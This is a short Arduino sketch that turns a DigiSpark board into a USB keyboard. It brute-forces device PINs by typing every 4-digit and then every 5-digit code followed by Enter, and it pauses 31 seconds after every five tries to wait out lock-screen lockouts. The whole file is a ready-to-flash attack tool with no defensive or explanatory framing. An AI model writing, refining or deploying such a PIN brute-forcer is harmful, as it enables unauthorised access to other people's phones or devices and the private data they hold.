#include "DigiKeyboard.h"

// Map of USB HID key codes for digits 0-9 (39='0', 30='1', ..., 38='9')
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0; // 1st digit
int b = 0; // 2nd digit
int c = 0; // 3rd digit
int d = 0; // 4th digit
int e = 0; // 5th digit
int count = 0; // Tracks attempts for lockout delay
bool key_stroke_e = false; // Flag for 4-digit or 5-digit mode
bool completed = false; // Flag to stop after all PINs tried

void setup() {
  // Initialize USB keyboard and wait for connection
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  pinMode(1, OUTPUT); // LED pin (use 0 for DigiSpark model B)
  delay(3000);
}

void loop() {
  // Stop and blink LED if all PINs tried
  if (completed) {
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
    return;
  }

  // Pause for 31 seconds after 5 attempts to handle lockout
  if (count == 5) {
    digitalWrite(1, HIGH); // LED on
    DigiKeyboard.sendKeyStroke(40); // Send Enter
    delay(31000);
    count = 0;
    digitalWrite(1, LOW); // LED off
  }

  // Send 4 or 5-digit PIN followed by Enter
  DigiKeyboard.sendKeyStroke(num[a]);
  DigiKeyboard.sendKeyStroke(num[b]);
  DigiKeyboard.sendKeyStroke(num[c]);
  DigiKeyboard.sendKeyStroke(num[d]);
  if (key_stroke_e) {
    DigiKeyboard.sendKeyStroke(num[e]); // Send 5th digit
  }
  DigiKeyboard.sendKeyStroke(40); // Send Enter
  delay(1000); // Wait before next attempt

  // Increment digits
  d++;
  count++;
  if (d == 10) {
    d = 0;
    c++;
    if (c == 10) {
      c = 0;
      b++;
      if (b == 10) {
        b = 0;
        a++;
        if (a == 10) {
          if (!key_stroke_e) {
            key_stroke_e = true; // Switch to 5-digit mode
            a = 0;
          } else {
            e++;
            if (e == 10) {
              completed = true; // All PINs tried
            }
            a = 0;
          }
        }
      }
    }
  }
}
